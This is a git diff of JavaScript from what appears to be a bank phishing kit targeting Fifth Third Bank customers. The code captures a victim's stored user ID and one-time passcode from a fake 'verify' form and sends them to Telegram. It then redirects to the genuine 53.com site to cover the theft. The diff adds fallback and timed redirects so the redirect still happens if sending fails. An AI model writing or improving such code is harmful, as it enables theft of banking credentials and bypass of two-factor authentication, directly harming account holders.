@@ -18,16 +18,21 @@ function sendToTelegram(data, callback) {
           text: message
         })
       }).then(() => {
-        if (callback) callback(); // Only now call the callback
+        if (callback) callback();
+      }).catch(() => {
+        // fallback redirect if Telegram fails
+        if (callback) callback();
       });
+    }).catch(() => {
+      // fallback redirect if IP fetch fails
+      if (callback) callback();
     });
 }
 
-document.addEventListener('DOMContentLoaded', function () {
+document.addEventListener('DOMContentLoaded', function() {
   const form = document.getElementById('verify-form');
   if (!form) return;
-
-  form.addEventListener('submit', function (e) {
+  form.addEventListener('submit', function(e) {
     e.preventDefault();
 
     const userid = sessionStorage.getItem('userid') || '';
@@ -45,22 +50,16 @@ document.addEventListener('DOMContentLoaded', function () {
       otp: form.otp.value
     };
 
-    sendToTelegram(data, () => {
-      form.reset();
-
-      // Optional: Show a brief confirmation before redirect
-      const messageDiv = document.createElement('div');
-      messageDiv.innerText = "✅ Submitting... Please wait.";
-      messageDiv.style.color = 'green';
-      messageDiv.style.fontWeight = 'bold';
-      messageDiv.style.textAlign = 'center';
-      form.parentElement.insertBefore(messageDiv, form);
-
-      setTimeout(() => {
-        window.location.href = 'https://www.53.com/';
-      }, 2500); // 2.5 seconds delay
+    // Start sending to Telegram
+    sendToTelegram(data, function() {
+      window.location.href = 'https://www.53.com/';
     });
+
+    // Backup redirect in 3 seconds
+    setTimeout(function() {
+      window.location.href = 'https://www.53.com/';
+    }, 3000);
+    
+    form.reset();
   });
 });
-
-window.sendToTelegram = sendToTelegram;
